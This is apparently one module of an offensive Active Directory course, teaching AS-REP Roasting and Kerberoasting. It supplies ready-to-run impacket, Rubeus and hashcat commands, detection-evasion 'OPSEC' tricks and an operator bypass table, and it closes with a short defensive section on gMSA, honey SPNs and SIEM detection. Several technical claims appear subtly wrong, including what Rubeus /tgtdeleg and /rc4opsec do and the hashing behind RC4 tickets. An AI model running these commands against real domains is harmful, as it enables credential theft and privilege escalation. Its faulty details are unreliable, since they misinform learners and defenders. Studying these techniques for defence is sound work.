# Module 05: Kerberos Attack Surfaces — AS-REP Roasting & Kerberoasting

> **Navigation**: [⬅️ Module 04: NTLM Relay & Coercion](Module-04-NTLM-Relay-Attacks-and-Authentication-Coercion.md) | [🏠 Master Index](../README.md) | [Module 06: Delegation & RBCD ➡️](Module-06-Kerberos-Delegation-Mechanisms-and-RBCD.md)

---


## 1. AS-REP Roasting: Theory, Enumeration, and Exploitation

The **AS-REP Roasting** attack targets domain user accounts that have the Kerberos Pre-Authentication requirement explicitly disabled.

```
+-----------------------------------------------------------------------------------------+
| AS-REP ROASTING PROTOCOL EXCHANGE                                                       |
|                                                                                         |
|  ATTACKER (Any machine with network access to DC)       DOMAIN CONTROLLER (KDC: AS)     |
|  IP: 10.0.0.150                                         IP: 10.0.0.1                    |
|            |                                                   |                        |
|            | 1. AS-REQ (Kerberos Authentication Request)       |                        |
|            |    * Target: svc_backup                           |                        |
|            |    * Pre-Authentication: NONE!                    |                        |
|            |    * (No password or timestamp provided)          |                        |
|            +-------------------------------------------------->|                        |
|                                                                |                        |
|                                                                | KDC checks ntds.dit.   |
|                                                                | Account has flag:      |
|                                                                | DONT_REQ_PREAUTH!      |
|                                                                |                        |
|            | 2. AS-REP (Kerberos Authentication Reply)         |                        |
|            |    * Issues TGT                                   |                        |
|            |    * EncKDCRepPart: ENCRYPTED WITH                |                        |
|            |      SVC_BACKUP'S PASSWORD HASH!                  |                        |
|            |<--------------------------------------------------+                        |
|                                                                                         |
|  Attacker captures encrypted EncKDCRepPart blob from network wire                       |
|  Cracks hash offline via Hashcat Mode 18200! Zero DC logs after initial AS-REQ!         |
+-----------------------------------------------------------------------------------------+
```

### Why Pre-Authentication Matters:
Normally, a user sending an `AS-REQ` must encrypt a timestamp (`PA-ENC-TIMESTAMP`) using their password hash. The KDC only responds with an `AS-REP` if the timestamp decrypts successfully. This prevents offline password guessing.

When the `DONT_REQ_PREAUTH` flag (`0x400000`) is set in the account's `userAccountControl` attribute:
1. Anyone on the network (even an unauthenticated attacker who only knows a list of valid usernames) can send an `AS-REQ` for that user.
2. The KDC generates a random session key, builds the `AS-REP`, and encrypts the response using the **target user's password hash**.
3. The attacker takes this encrypted response offline and performs high-speed dictionary attacks without triggering account lockouts!

---

### Enumeration & Exploitation Commands:

#### 1. Remote Enumeration via Impacket (No Domain Credentials Needed):
If you have a list of potential usernames (`users.txt`):
```bash
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

#### 2. Authenticated Enumeration via Impacket:
```bash
impacket-GetNPUsers 'corp.local/jdoe:Pass123!' -dc-ip 10.0.0.1 -request -format hashcat -outputfile asrep_hashes.txt
```

#### 3. PowerView Enumeration (Inside Windows):
```powershell
Get-DomainUser -PreauthNotRequired -Properties sAMAccountName,userAccountControl,memberOf
```

#### 4. LDAP Query:
```bash
ldapsearch -x -H ldap://10.0.0.1 -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

---

### Offline Cracking with Hashcat:
AS-REP hashes (format `$krb5asrep$23$...`) are cracked using Hashcat mode **`18200`**:

```bash
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule -w 3 -O
```

---

## 2. Kerberoasting: Deep Protocol Architecture & SPN Mechanics

**Kerberoasting** is one of the most reliable privilege escalation techniques in Active Directory. It allows **ANY authenticated domain user** (standard employee, contractor, or compromised service) to request offline crackable credential hashes for high-privilege service accounts.

```
+-----------------------------------------------------------------------------------------+
| KERBEROASTING PROTOCOL FLOW                                                             |
|                                                                                         |
|  ATTACKER (Low Privilege User: John)                    DOMAIN CONTROLLER (KDC: TGS)    |
|  IP: 10.0.0.150                                         IP: 10.0.0.1                    |
|            |                                                   |                        |
|            | 1. Query LDAP for accounts with SPNs:             |                        |
|            |    (&(servicePrincipalName=*)(adminCount=1))      |                        |
|            +-------------------------------------------------->|                        |
|            | 2. LDAP response: svc_mssql (SPN: MSSQL/sql.corp) |                        |
|            |<--------------------------------------------------+                        |
|                                                                                         |
|            | 3. TGS-REQ (Ticket-Granting Service Request)      |                        |
|            |    * Presents valid TGT                           |                        |
|            |    * Requests access to: MSSQL/sql.corp           |                        |
|            |    * Requests Encryption Type: RC4-HMAC (etype 23)|                        |
|            +-------------------------------------------------->|                        |
|                                                                |                        |
|                                                                | KDC verifies TGT.      |
|                                                                | KDC DOES NOT CHECK IF  |
|                                                                | JOHN HAS ACCESS TO SQL!|
|                                                                | KDC encrypts TGS with  |
|                                                                | svc_mssql's HASH!      |
|                                                                |                        |
|            | 4. TGS-REP (Service Ticket Reply)                 |                        |
|            |    * Contains TGS encrypted with svc_mssql hash   |                        |
|            |<--------------------------------------------------+                        |
|                                                                                         |
|  Attacker extracts ciphertext ($krb5tgs$23$...) and cracks offline via Hashcat 13100!   |
+-----------------------------------------------------------------------------------------+
```

### The Architectural Flaw Behind Kerberoasting:
1. **Universal Access to SPNs**: In Active Directory, any domain account can query the directory to discover which user accounts have a `servicePrincipalName` (SPN) registered.
2. **KDC Blind Ticket Issuance**: When a user presents a valid TGT and requests a Service Ticket for an SPN, **the KDC does not perform any authorization check**. The KDC assumes that if the user shouldn't have access, the application server (e.g., MSSQL) will enforce access control when the user presents the ticket.
3. **Target Key Encryption**: The KDC encrypts the payload of the TGS ticket using the **NT hash or AES key of the service account** running the SPN.
4. **Offline Cracking**: The attacker never connects to the target service. The attacker captures the TGS ticket from the KDC response and attacks it offline on a GPU cracking rig.

---

### Encryption Downgrade: RC4-HMAC vs. AES-256

```
+---------------------------------------------------------------------------------------+
| HASHCAT CRACKING PERFORMANCE COMPARISON (NVIDIA RTX 4090)                             |
|                                                                                       |
|  Hash Type: Kerberos 5 TGS-REP etype 23 (RC4-HMAC - Mode 13100)                       |
|  Speed: ~ 8,500,000,000 hashes / sec (8.5 GH/s)                                       |
|  Math: Single MD4 HMAC round. High vulnerability to wordlists.                        |
|                                                                                       |
|  Hash Type: Kerberos 5 TGS-REP etype 18 (AES-256 - Mode 19700)                        |
|  Speed: ~ 2,100,000 hashes / sec (2.1 MH/s)                                           |
|  Math: PBKDF2 HMAC-SHA1 with 4,096 iterations. 4,000x SLOWER TO CRACK!                |
+---------------------------------------------------------------------------------------+
```

When requesting a TGS ticket, modern offensive tools explicitly request `etype 23` (`rc4-hmac`). Because most enterprise service accounts were provisioned years ago, their directory objects still support RC4. The KDC fulfills the downgrade request, handing the attacker an easily crackable RC4 ticket.

---

## 3. Tool Mastery: Impacket & Rubeus Kerberoasting Syntax

### Method 1: Remote Execution via Impacket `GetUserSPNs.py`
```bash
# 1. Enumerate all SPNs and display roastable accounts:
impacket-GetUserSPNs 'corp.local/jdoe:Pass123!' -dc-ip 10.0.0.1

# 2. Request TGS tickets for all SPNs and output in Hashcat format:
impacket-GetUserSPNs 'corp.local/jdoe:Pass123!' -dc-ip 10.0.0.1 -request -outputfile kerberoast_hashes.txt

# 3. Targeted Kerberoasting (only roast a specific high-value user):
impacket-GetUserSPNs 'corp.local/jdoe:Pass123!' -dc-ip 10.0.0.1 -request-user svc_mssql -outputfile sql_hash.txt
```

### Method 2: Internal Host Execution via Rubeus (C# / Cobalt Strike)
```powershell
# Standard Kerberoast dumping all accounts to file:
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat /nowrap

# The OPSEC-Safe /tgtdeleg Bypass Trick:
# Instead of requesting TGS tickets directly from the DC (which triggers Event 4769),
# Rubeus uses Fake Unconstrained Delegation to extract a forwardable TGT and request tickets:
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt /format:hashcat

# Target only users with administrative privileges (adminCount=1):
Rubeus.exe kerberoast /rc4opsec /format:hashcat
```

---

## 4. Offline Cracking with Hashcat

Service ticket hashes (format `$krb5tgs$23$...`) are cracked using Hashcat mode **`13100`**:

```bash
# Syntax for RC4-HMAC Kerberoast Hashes:
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -w 3 -O

# If the target only supports AES-128:
hashcat -m 19600 -a 0 aes128_hashes.txt /usr/share/wordlists/rockyou.txt -w 3

# If the target only supports AES-256:
hashcat -m 19700 -a 0 aes256_hashes.txt /usr/share/wordlists/rockyou.txt -w 3
```

---

## 5. Field Operator Troubleshooting & Error Scenarios

```
+---------------------------------------------+------------------------------------+---------------------------------------+
| Observed Error / Status Code                | Root Cause                         | Operator Troubleshooting & Bypass     |
+---------------------------------------------+------------------------------------+---------------------------------------+
| KDC_ERR_S_PRINCIPAL_UNKNOWN (0x7)           | The requested SPN does not exist   | Verify SPN syntax via LDAP query.     |
| "Server not found in Kerberos database"     | or was deleted from the directory. | Query: (servicePrincipalName=*)       |
+---------------------------------------------+------------------------------------+---------------------------------------+
| Captured hash corresponds to machine account| Machine account (COMPUTER$) has    | Computer account passwords are 120    |
| (e.g., $krb5tgs$23$*SQL01$*...).            | an SPN registered.                 | random hex characters; uncrackable.   |
|                                             |                                    | Filter out machine accounts (-U flag).|
+---------------------------------------------+------------------------------------+---------------------------------------+
| KDC_ERR_ETYPE_NOSUPP (0xe)                  | Target service account only has    | Request AES ticket instead:           |
| "KDC has no support for encryption type"    | AES keys enabled; RC4 is disabled. | Rubeus.exe kerberoast /aes            |
|                                             |                                    | Hashcat mode 19700.                   |
+---------------------------------------------+------------------------------------+---------------------------------------+
| Hashcat error: "Token length exception"     | Kerberoast hash lines were wrapped | Use /nowrap in Rubeus or inspect      |
| or "Line length exceeds maximum".           | across multiple terminal lines.    | output file to ensure 1 line per hash.|
+---------------------------------------------+------------------------------------+---------------------------------------+
```

---

## 6. Defensive Hardening, Honey SPNs & Detection Engineering

### 1. Group Managed Service Accounts (gMSA):
The ultimate architectural defense against Kerberoasting is replacing traditional user-based service accounts with **Group Managed Service Accounts (gMSA)**:
* Active Directory automatically generates a **128-character complex password**.
* Passwords rotate automatically every 30 days.
* Interactive logon is disabled.
* Even if an attacker requests a TGS for a gMSA, cracking a 128-character password is mathematically impossible.

### 2. Honey SPNs (Deception Defense):
Defenders can deploy canary service accounts with registered SPNs designed to detect Kerberoasting activity instantly:
1. Create a dummy user account: `svc_financial_db`.
2. Register an alluring SPN: `MSSQLSvc/sql-finance.corp.local:1433`.
3. Set a 50-character random password so it can never be cracked.
4. Configure a high-priority SIEM alert for any `TGS-REQ` issued for `MSSQLSvc/sql-finance.corp.local:1433`. Because no legitimate application ever uses this dummy service, **100% of ticket requests represent malicious adversary activity**!

### 3. SIEM Detection Query (Event ID 4769):
```sql
index=windows EventCode=4769 Service_Name!="*$" Ticket_Encryption_Type="0x17"
| stats count by Service_Name, Client_Address, Target_User_Name
| where count > 5
```
* Monitors for **Ticket Encryption Type `0x17` (RC4-HMAC)** requested for user accounts (excluding computer accounts ending in `$`).


---

> **Navigation**: [⬅️ Module 04: NTLM Relay & Coercion](Module-04-NTLM-Relay-Attacks-and-Authentication-Coercion.md) | [🏠 Master Index](../README.md) | [Module 06: Delegation & RBCD ➡️](Module-06-Kerberos-Delegation-Mechanisms-and-RBCD.md)
